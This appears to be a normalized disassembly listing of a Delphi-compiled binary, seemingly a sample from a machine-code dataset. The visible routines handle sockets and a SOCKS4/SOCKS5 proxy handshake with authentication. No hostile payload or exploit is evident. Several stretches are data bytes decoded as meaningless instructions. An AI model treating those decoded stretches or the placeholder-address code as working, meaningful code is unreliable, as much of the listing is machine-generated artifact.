call sub_404008
jmp r-xdata
sub_473c90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_473ba8
mov eax esi
mov edx r-xdata
call sub_404414
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_40460c
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404528
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_40405c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_4042c8
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404528
jmp r-xdata
mov eax ebx
call sub_404008
jmp r-xdata
sub_473d64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_473e17
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473e1e
retn
mov eax rw-data
call sub_40d524
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
call sub_404008
mov eax rw-data
mov edx [ r-xdata ]
call sub_40538c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40538c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404abc
sub_473e20
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_473ef3
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473efa
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea eax [ ebp - 0x4 ]
call sub_473b20
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_40405c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402d64
jne r-xdata
mov eax sub_40c6e8
mov [ rw-data ] eax
mov [ rw-data ] sub_473d5c
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40526c
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40405c
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40526c
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40405c
sub_474258
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_474284
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_4742c8
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4742c8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_473d48
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_4742f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474315
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47431c
retn
sub_474508
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420714
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_47457a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_403558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474581
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_472154
mov edx [ rw-data ]
mov [ edx ] eax
sub_4745a0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035c0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_420760
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_474607
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47460e
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40d524
sub_474620
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4746cb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4746d2
lea eax [ ebp - 0x10 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_40905c
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_40905c
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_4746dc
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_474714
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_474744
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_474774
or [ eax ] eax
add [ eax ] al
add al 0xf7
inc edi
add al cl
stc
inc edi
add [ eax ] al
test [ edi ] rw-data
cld
test [ edi ] 0xc8
stc
inc edi
add al bh
test [ edi ] 0xc8
stc
inc edi
add ah dh
test [ edi ] 0x44
cli
inc edi
add al dh
test [ edi ] 0x88
cld
inc edi
add ah ch
test [ edi ] 0x28
clc
inc edi
add al ch
test [ edi ] 0xd8
cli
inc edi
add ah ah
test [ edi ] 0xc4
clc
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4747fc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474803
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_404abc
sub_474920
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4745a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_474954
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474979
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474980
retn
sub_474a91
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x420b0003 ] al
jns r-xdata
add [ eax ] al
add [ eax ] al
dec eax
dec ebx
jae r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24478b76
xor al [ eax ]
sbb eax 0x54644945
push 0x74746f72
insb
dec esi
outsd
inc ebx
push 0x656e6961
dec ecx
insb
jb r-xdata
jb r-xdata
dec eax
popad
outsb
insb
rcl [ ebx - 0x75 ] 0xd8
mov eax ebx
call sub_474914
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
xchg esp eax
adc [ eax ] al
insb
add [ eax ] al
[ eax + eax ]
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
ror [ eax + 0x4b ] 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4b ] cl
dec ebx
inc edi
arpl [ gs : eax + edx + 0x4c9c0040 ] dx
inc edi
add [ eax ] ah
dec esi
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x420a0004 ] al
imul esi [ ebx + esi * 2 + 0x50 ] 0x65537265
arpl ax bp
dec eax
inc edi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430e0005 ] al
push 0x656e6961
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x40 ]
sub_474b80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403988#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_474918
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov edx [ ebp + 0x18 ]
push edx
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x44 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474c1f
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_474c3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_474508
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_474c74
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_474920
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_474cbc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_403988#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_474950
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov edx [ eax ]
call [ edx + 0x4c ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474d25
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_474d40
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebx + 0x6c ] 0x0
jbe r-xdata
mov edx esi
mov ecx ebp
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov esi eax
jmp r-xdata
call sub_473b8c
mov edi eax
mov edx esi
mov ecx ebp
mov eax [ ebx + 0x68 ]
mov esi [ eax ]
call [ esi + 0x54 ]
mov esi eax
call sub_473b8c
mov edx eax
mov eax edi
call sub_473b94
mov edi eax
imul eax esi 0x3e8
xor edx edx
div [ ebx + 0x6c ]
cmp edi eax
jae r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub eax edi
call sub_473d40
jmp r-xdata
sub_474dac
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov [ esp ] edx
mov ebx eax
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
xor ebx ebx
mov ecx [ ebx + 0x6c ]
test ecx ecx
jbe r-xdata
mov edx [ esp ]
mov ecx ebp
mov ebx [ eax ]
call [ ebx + 0x58 ]
mov ebx eax
jmp r-xdata
imul eax ebp 0x3e8
xor edx edx
div ecx
mov edi eax
call sub_473b8c
mov esi eax
mov edx [ esp ]
mov ecx ebp
mov eax [ ebx + 0x68 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
mov ebx eax
call sub_473b8c
mov edx eax
mov eax esi
call sub_473b94
mov esi eax
cmp esi edi
jae r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
sub eax esi
call sub_473d40
jmp r-xdata
sub_474e28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474e4d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474e54
retn
sub_474e60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474e85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474e8c
retn
sub_475052
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040004 ] al
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
pop es
push esi
jb r-xdata
int3
imul ebp [ edi + 0x6e ] 0x5300408d
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ab48
mov edi esi
mov al [ ebx + 0x68 ]
mov [ edi + 0x68 ] al
lea eax [ edi + 0x6c ]
mov edx [ ebx + 0x6c ]
call sub_40405c
lea eax [ edi + 0x70 ]
mov edx [ ebx + 0x70 ]
call sub_40405c
mov eax [ ebx + 0x74 ]
mov [ edi + 0x74 ] eax
lea eax [ edi + 0x78 ]
mov edx [ ebx + 0x78 ]
call sub_40405c
mov al [ ebx + 0x7c ]
mov [ edi + 0x7c ] al
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47514c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_474508
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_475190
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_475399
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_472160
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472718
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_472718
mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_4042c8
push eax
mov eax edi
call sub_4044c8
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_402998
mov eax edi
call sub_4042c8
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_4042a4
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4753a0
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_40402c
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
sub_4753b8
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47598b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_403800
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_4042c8
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_4042c8
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_4042c8
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042c8
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_402998
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push j_sub_4036d4#2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_402998
mov eax [ ebx + 0x78 ]
call sub_4042c8
add esi eax
mov eax [ ebx + 0x70 ]
call sub_4042c8
mov [ ebp + esi - 0x110 ] al
inc esi
mov eax [ ebx + 0x70 ]
call sub_4042c8
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_4042c8
push eax
mov eax [ ebx + 0x78 ]
call sub_4044c8
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_402998
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_4042c8
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_403800#7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_4042c8
push eax
mov eax [ ebx + 0x70 ]
call sub_4044c8
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_402998
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp [ eax * 4 + sub_475734 ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
push ebp
push j_sub_4036d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475992
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_40402c
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_475734
fistp [ eax + 0x47 ]
add [ ebp + 0x57 ] bl
inc edi
add [ ecx - 0x4affb8a9 ] cl
push edi
inc edi
add cl ah
push edi
inc edi
add [ 0x39004758 ] cl
pop eax
inc edi
add [ edx + 0x58 ] ah
inc edi
add [ ebx - 0x16ffb8a8 ] cl
jle r-xdata
add [ ebp - 0x1276b ] cl
jmp [ ecx + rw-data ]
add [ eax ] al
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_4036d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475992
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_40402c
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_47599c
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_475190
pop ebx
retn
je r-xdata
call sub_4753b8
jmp r-xdata
pop ebx
retn
sub_4759b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4759dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4759e4
retn
sub_475a7b
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
insb
mov eax eax
cwde
pop edx
inc edi
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
push esp
adc [ eax ] al
sub [ eax ] al
add bh bh
sub [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or eax 0x65696c43
popad
outsb
insb
cmp al 0x5a
inc edi
add [ ebx + eax * 4 ] ch
inc ecx
add [ eax + eax ] al
push cs
dec ecx
